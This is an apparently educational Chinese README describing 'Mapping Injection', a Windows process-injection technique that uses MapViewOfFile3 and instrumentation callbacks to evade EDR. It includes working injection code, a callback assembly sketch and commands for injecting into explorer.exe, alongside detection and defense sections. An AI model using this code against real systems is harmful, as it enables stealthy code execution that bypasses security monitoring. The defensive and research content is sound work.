# Technique #17: Mapping Injection

## 概述

**Mapping Injection** 是一种使用内存映射绕过常见 EDR 检测的进程注入技术。通过使用 `CreateFileMapping` + `MapViewOfFile3` + `NtSetInformationProcess(ProcessInstrumentationCallback)`，完全避免了传统注入技术中被严格监控的 API 调用。

**关键特性**：
- ✅ 不使用 VirtualAllocEx（避免内存分配监控）
- ✅ 不使用 WriteProcessMemory（避免跨进程写入监控）
- ✅ 不使用 CreateRemoteThread（避免远程线程创建监控）
- ✅ 利用合法的 Windows API（文件映射、instrumentation callback）
- ✅ 隐蔽的 syscall 模式
- ⚠️ 需要 Windows 10 1703+ (build 10.0.15063+)
- ⚠️ 需要 SeDebugPrivilege

---

## 技术原理

### Syscall 模式对比

**传统进程注入**：
```
OpenProcess
  ↓
VirtualAllocEx        ← EDR 监控重点
  ↓
WriteProcessMemory    ← EDR 监控重点
  ↓
CreateRemoteThread    ← EDR 监控重点
```

**Mapping Injection**：
```
OpenProcess
  ↓
CreateFileMapping     ← 合法文件映射
  ↓
MapViewOfFile3 (本地) ← 写入数据到本地映射
  ↓
MapViewOfFile3 (远程) ← 将映射共享到目标进程
  ↓
NtSetInformationProcess(ProcessInstrumentationCallback) ← 触发执行
```

### 核心概念

#### 1. 内存映射（Memory Mapping）

**传统方法**的问题：
- `VirtualAllocEx` - 在目标进程分配内存（高度可疑）
- `WriteProcessMemory` - 跨进程写入（被 EDR 严格监控）

**Mapping 方法**的优势：
- `CreateFileMapping` - 创建匿名文件映射对象（不关联磁盘文件）
- `MapViewOfFile3` - 将映射视图映射到不同进程的地址空间
- 两个进程共享同一块物理内存，数据自动同步

```
┌─────────────────────────────────────────────────────────────┐
│              内存映射工作原理                                 │
└─────────────────────────────────────────────────────────────┘

[1] 创建文件映射对象
┌────────────────┐
│ CreateFileMapping  │ ← 创建匿名映射（INVALID_HANDLE_VALUE）
└────────────────┘
         │
         v
┌────────────────┐
│  File Mapping  │ ← 内核对象，可被多个进程引用
│    Object      │
└────────────────┘

[2] 映射到本地进程
┌────────────────┐
│ MapViewOfFile3 │ ← Process = GetCurrentProcess()
│  (本地进程)    │
└────────────────┘
         │
         v
┌────────────────┐
│  0x00007FF8... │ ← 本地进程中的地址
│  [RW 内存]     │
└────────────────┘
         │
         │ 写入数据（memcpy）
         v
┌────────────────┐
│  shellcode...  │
└────────────────┘

[3] 映射到远程进程
┌────────────────┐
│ MapViewOfFile3 │ ← Process = hTargetProcess
│  (远程进程)    │
└────────────────┘
         │
         v
┌────────────────┐
│  0x00007FF9... │ ← 远程进程中的地址
│  [RX 内存]     │ ← 数据自动同步！
└────────────────┘
         │
         v
┌────────────────┐
│  shellcode...  │ ← 与本地进程完全相同
└────────────────┘
```

**关键点**：
- 两个进程看到的是同一块物理内存
- 本地写入的数据在远程进程立即可见
- 不需要 `WriteProcessMemory`

#### 2. MapViewOfFile3

**为什么是 MapViewOfFile3？**

Windows API 演进：
- `MapViewOfFile` - 只能映射到当前进程
- `MapViewOfFile2` - 增加 NUMA 支持
- **`MapViewOfFile3`** - **可以指定目标进程**（Windows 10 1703+）

```c
PVOID MapViewOfFile3(
    HANDLE FileMapping,         // 文件映射对象
    HANDLE Process,             // 目标进程句柄 ← 关键！
    PVOID BaseAddress,          // 基址（通常为 NULL）
    ULONG64 Offset,             // 偏移
    SIZE_T ViewSize,            // 视图大小（0 = 整个映射）
    ULONG AllocationType,       // 分配类型
    ULONG PageProtection,       // 页保护（PAGE_READWRITE, PAGE_EXECUTE_READ）
    MEM_EXTENDED_PARAMETER *ExtendedParameters,
    ULONG ParameterCount
);
```

**核心能力**：
```c
// 本地映射（写入数据）
LPVOID local = MapViewOfFile3(hFileMap, GetCurrentProcess(), ...);
memcpy(local, shellcode, size);

// 远程映射（共享数据）
LPVOID remote = MapViewOfFile3(hFileMap, hTargetProcess, ...);
// remote 指向的内存包含与 local 相同的数据！
```

#### 3. Process Instrumentation Callback

**什么是 Instrumentation Callback？**

这是 Windows 提供的合法性能分析机制，允许在进程调用 syscall 时插入回调函数。

```c
typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION {
    ULONG Version;    // 0 for x64, 1 for x86
    ULONG Reserved;   // Always 0
    PVOID Callback;   // 回调函数地址
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

NtSetInformationProcess(
    hProcess,
    ProcessInstrumentationCallback,  // = 40
    &callbackInfo,
    sizeof(callbackInfo)
);
```

**执行流程**：
```
目标进程调用 syscall (如 NtOpenFile)
  ↓
Windows 内核检测到 ProcessInstrumentationCallback
  ↓
跳转到我们的回调地址
  ↓
执行 shellcode
  ↓
恢复正常 syscall 执行
```

**为什么隐蔽？**
- 这是合法的 Windows 性能分析机制
- 不创建新线程（不触发 `CreateRemoteThread` 检测）
- 在目标进程正常执行流程中触发

#### 4. Callback Shellcode 结构

我们的 callback 需要实现三个功能：

```
┌─────────────────────────────────────────────────────────────┐
│                    Callback 结构                             │
└─────────────────────────────────────────────────────────────┘

[全局变量检查]
  ↓
┌────────────────┐
│ cmp [flag], 0  │ ← 检查是否已执行
└────────────────┘
  │           │
  已执行       未执行
  │           │
  │           v
  │    ┌────────────────┐
  │    │ 保存所有寄存器  │ ← push rax, rbx, ...
  │    └────────────────┘
  │           │
  │           v
  │    ┌────────────────┐
  │    │ 调用 payload    │ ← call shellcode
  │    └────────────────┘
  │           │
  │           v
  │    ┌────────────────┐
  │    │ 恢复所有寄存器  │ ← pop ..., rbx, rax
  │    └────────────────┘
  │           │
  │           v
  │    ┌────────────────┐
  │    │ 设置 flag = 1   │ ← 标记已执行
  │    └────────────────┘
  │           │
  └───────────┴─────────
              │
              v
       ┌────────────────┐
       │ 调用原始 syscall│ ← syscall 号在 rax
       └────────────────┘
```

**完整数据结构**：
```
┌────────────────────────────────┐
│ 全局变量（1 字节）              │ ← 标记位（0 = 未执行，1 = 已执行）
├────────────────────────────────┤
│ Callback Shellcode (586 字节)  │
│  ├─ 前导码（检查全局变量）      │
│  ├─ 寄存器保存/恢复            │
│  ├─ Payload 调用               │
│  └─ Syscall 转发               │
├────────────────────────────────┤
│ Payload Shellcode (可变长度)   │ ← 实际要执行的代码（如 MessageBox）
└────────────────────────────────┘
```

### 完整执行流程

```
┌─────────────────────────────────────────────────────────────┐
│                  Mapping Injection 完整流程                  │
└─────────────────────────────────────────────────────────────┘

[1] 准备阶段
    ┌────────────────┐
    │ 读取 shellcode │
    │ 构建 callback  │
    │ 提升权限       │
    │ 打开目标进程   │
    └────────────────┘

[2] 分配全局变量
    ┌─────────────────────────┐
    │ CreateFileMapping       │ ← 1 字节，PAGE_READWRITE
    ├─────────────────────────┤
    │ MapViewOfFile3 (本地)   │
    │  ├─ 写入 0x00           │
    ├─────────────────────────┤
    │ MapViewOfFile3 (远程)   │ ← 返回远程地址 A
    └─────────────────────────┘

[3] 分配 Callback + Shellcode
    ┌─────────────────────────┐
    │ CreateFileMapping       │ ← callback_size + shellcode_size
    ├─────────────────────────┤
    │ MapViewOfFile3 (本地)   │
    │  ├─ 复制 callback       │
    │  ├─ 修改偏移 +2 为地址 A│ ← 填入全局变量地址
    │  └─ 追加 shellcode      │
    ├─────────────────────────┤
    │ MapViewOfFile3 (远程)   │ ← PAGE_EXECUTE_READ
    │                         │ ← 返回远程地址 B
    └─────────────────────────┘

[4] 设置 Instrumentation Callback
    ┌─────────────────────────┐
    │ NtSetInformationProcess │
    │  ProcessInformation =   │
    │    {                    │
    │      Version = 0,       │
    │      Reserved = 0,      │
    │      Callback = B ──────┼─→ 指向远程 callback
    │    }                    │
    └─────────────────────────┘

[5] 等待触发
    目标进程正常执行...
         │
         v
    ┌─────────────────────────┐
    │ 调用 syscall (如 NtRead)│
    └─────────────────────────┘
         │
         v
    ┌─────────────────────────┐
    │ Windows 检测到 callback  │
    │ 跳转到地址 B            │
    └─────────────────────────┘
         │
         v
    ┌─────────────────────────┐
    │ 检查全局变量（地址 A）   │
    │  └─ 值为 0 → 执行       │
    └─────────────────────────┘
         │
         v
    ┌─────────────────────────┐
    │ 执行 payload shellcode   │
    │  (如 MessageBox)        │
    └─────────────────────────┘
         │
         v
    ┌─────────────────────────┐
    │ 设置全局变量 = 1        │
    └─────────────────────────┘
         │
         v
    ┌─────────────────────────┐
    │ 继续原始 syscall         │
    └─────────────────────────┘
```

---

## 与其他技术的对比

| 特性 | Mapping Injection | 传统注入 | Reflective DLL | PE Injection |
|------|-------------------|----------|----------------|--------------|
| **VirtualAllocEx** | ❌ 不使用 | ✅ 使用 | ✅ 使用 | ✅ 使用 |
| **WriteProcessMemory** | ❌ 不使用 | ✅ 使用 | ✅ 使用 | ✅ 使用 |
| **CreateRemoteThread** | ❌ 不使用 | ✅ 使用 | ✅ 使用 | ✅ 使用 |
| **内存分配方式** | 文件映射 | 直接分配 | 直接分配 | 直接分配 |
| **执行触发方式** | Instrumentation Callback | 远程线程 | 远程线程 | 远程线程 |
| **Windows 版本要求** | 10 1703+ | 任意 | 任意 | 任意 |
| **隐蔽性** | 极高 | 低 | 中 | 中 |
| **EDR 检测难度** | 高 | 低 | 中 | 中 |

**Linus: "Theory and practice sometimes clash. Theory loses."**

理论上，Mapping Injection 应该更难被检测。实践证明确实如此 - 它绕过了大多数 EDR 的常规检测规则。

---

## 编译和使用

### 系统要求

- Windows 10 1703+ (build 10.0.15063+)
- 64-bit 系统
- SeDebugPrivilege（管理员权限）

### 编译

```bash
# Windows (cmd)
cd techniques/17-mapping-injection
build.bat

# Linux/MSYS (bash)
chmod +x build.sh
./build.sh
```

**输出文件**：
- `build/mapping_injection.exe` - 注入器
- `build/generate_shellcode.exe` - Shellcode 生成器
- `build/payload.bin` - 默认测试 shellcode

### 使用方法

#### 1. 生成 Shellcode

```bash
# MessageBox
build\generate_shellcode.exe messagebox payload.bin

# Calculator
build\generate_shellcode.exe calc payload.bin

# Exit process
build\generate_shellcode.exe exit payload.bin
```

#### 2. 执行注入

```bash
# 按进程名注入
build\mapping_injection.exe explorer.exe build\payload.bin

# 按 PID 注入
build\mapping_injection.exe 1234 build\payload.bin
```

### 测试步骤

1. **启动目标进程**：
   ```bash
   start explorer.exe
   ```

2. **执行注入**：
   ```bash
   build\mapping_injection.exe explorer.exe build\payload.bin
   ```

3. **观察结果**：
   - 当 `explorer.exe` 调用任何 syscall 时（几乎立即发生）
   - Instrumentation callback 被触发
   - Shellcode 执行（如弹出 MessageBox）

---

## 检测和防御

### EDR 检测方法

#### 1. API Hook

**监控关键 API**：
```c
// 检测 MapViewOfFile3 的可疑调用
Hook: kernelbase!MapViewOfFile3
  if (Process != GetCurrentProcess()) {
      // 映射到其他进程 - 可疑
      if (PageProtection & PAGE_EXECUTE) {
          // 可执行内存 - 高度可疑
          Alert();
      }
  }

// 检测 NtSetInformationProcess
Hook: ntdll!NtSetInformationProcess
  if (ProcessInformationClass == ProcessInstrumentationCallback) {
      // 设置 instrumentation callback - 可疑
      Alert();
  }
```

#### 2. 内存扫描

**检测异常内存映射**：
```c
// 遍历进程内存区域
VirtualQueryEx() {
    if (Type == MEM_MAPPED) {  // 映射内存
        if (Protect & PAGE_EXECUTE) {  // 可执行
            // 检查是否对应已知文件
            QueryWorkingSetEx() {
                if (Shared == TRUE && !IsKnownFile()) {
                    // 共享的可执行映射，非已知 DLL
                    Alert();
                }
            }
        }
    }
}
```

#### 3. Instrumentation Callback 监控

**检测 callback 设置**：
```c
// 内核驱动监控
ObRegisterCallbacks() {
    on NtSetInformationProcess {
        if (ProcessInformationClass == 40) {  // ProcessInstrumentationCallback
            // 记录调用者和目标进程
            // 检查 callback 地址是否在已知模块
            CheckCallbackAddress();
        }
    }
}
```

### 防御方法

#### 1. 进程保护

```c
// 使用 PPL (Protected Process Light)
SetProcessMitigationPolicy(ProcessSignaturePolicy, ...);

// 限制 OpenProcess
// 通过 ACL 阻止未授权访问
```

#### 2. 禁用 Instrumentation Callback

```c
// 在目标进程启动时
// 通过 IFEO (Image File Execution Options) 注册表
// 设置 DisableInstrumentationCallback = 1
```

#### 3. 实时监控

```c
// EDR 实时监控：
// 1. MapViewOfFile3 到其他进程
// 2. NtSetInformationProcess(ProcessInstrumentationCallback)
// 3. 异常的共享内存映射
```

---

## 技术细节

### Callback Shellcode 反汇编

```assembly
; 完整 callback shellcode 反汇编（简化版）

callback_start:
    ; 加载全局变量地址（偏移 +2 处填入）
    mov rdx, 0x7FFFFFFFFFFF    ; 占位符，运行时替换

    ; 检查全局变量
    cmp byte ptr [rdx], 0      ; 是否已执行？
    je  execute_payload        ; 未执行 -> 跳转
    jmp restore_and_syscall    ; 已执行 -> 跳过

execute_payload:
    ; 保存所有寄存器
    push r10, rax, rbx, rbp, rdi, rsi, rsp
    push r12, r13, r14, r15
    sub rsp, 0x20              ; Shadow space

    ; 调用 payload（offset +0x1A9）
    lea rcx, [rip + payload_offset]
    call execute_shellcode

    ; 恢复寄存器
    add rsp, 0x20
    pop r15, r14, r13, r12
    pop rsp, rsi, rdi, rbp, rbx, rax, r10

    ; 设置全局变量 = 1
    mov byte ptr [rdx], 1

restore_and_syscall:
    ; 跳转到原始 syscall
    jmp r10                    ; r10 包含原始 syscall 地址
```

### MapViewOfFile3 实现

```c
// 完整的映射分配函数
LPVOID MappingInjectionAlloc(
    HANDLE hProc,
    unsigned char *buffer,
    SIZE_T bufferSize,
    DWORD protectionType
) {
    // 1. 创建文件映射对象
    HANDLE hFileMap = CreateFileMapping(
        INVALID_HANDLE_VALUE,    // 匿名映射（不关联文件）
        NULL,                    // 默认安全描述符
        PAGE_EXECUTE_READWRITE,  // 最大保护
        0,                       // 高位大小
        (DWORD)bufferSize,       // 低位大小
        NULL                     // 无名称
    );

    // 2. 映射到本地进程（RW）
    LPVOID lpLocal = MapViewOfFile3(
        hFileMap,                // 文件映射句柄
        GetCurrentProcess(),     // 本地进程
        NULL,                    // 系统选择地址
        0,                       // 偏移 0
        0,                       // 整个映射
        0,                       // 无特殊分配类型
        PAGE_READWRITE,          // 可读写（用于写入数据）
        NULL,                    // 无扩展参数
        0
    );

    // 3. 写入数据
    memcpy(lpLocal, buffer, bufferSize);

    // 4. 映射到远程进程（根据需要设置保护）
    LPVOID lpRemote = MapViewOfFile3(
        hFileMap,                // 同一个映射对象
        hProc,                   // 目标进程
        NULL,                    // 系统选择地址
        0,                       // 偏移 0
        0,                       // 整个映射
        0,                       // 无特殊分配类型
        protectionType,          // PAGE_READWRITE 或 PAGE_EXECUTE_READ
        NULL,                    // 无扩展参数
        0
    );

    // 5. 清理本地映射
    UnmapViewOfFile(lpLocal);
    CloseHandle(hFileMap);

    return lpRemote;  // 返回远程地址
}
```

### NtSetInformationProcess 调用

```c
// 设置 instrumentation callback
PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION callbackInfo;
callbackInfo.Version = 0;              // 0 for x64, 1 for x86
callbackInfo.Reserved = 0;             // 始终为 0
callbackInfo.Callback = callbackAddr;  // 远程 callback 地址

NTSTATUS status = NtSetInformationProcess(
    hTargetProcess,
    (PROCESS_INFORMATION_CLASS)40,  // ProcessInstrumentationCallback
    &callbackInfo,
    sizeof(callbackInfo)
);

// 成功后，目标进程的每次 syscall 都会先调用 callbackAddr
```

---

## 参考资料

- [Mapping-Injection by @splinter_code](https://github.com/antonioCoco/Mapping-Injection)
- [Weaponizing Mapping Injection](https://splintercod3.blogspot.com/p/weaponizing-mapping-injection-with.html)
- [MapViewOfFile3 Documentation](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile3)
- [Process Instrumentation Callback](https://github.com/ionescu007/HookingNirvana)

---

## License

本项目仅用于安全研究和教育目的。
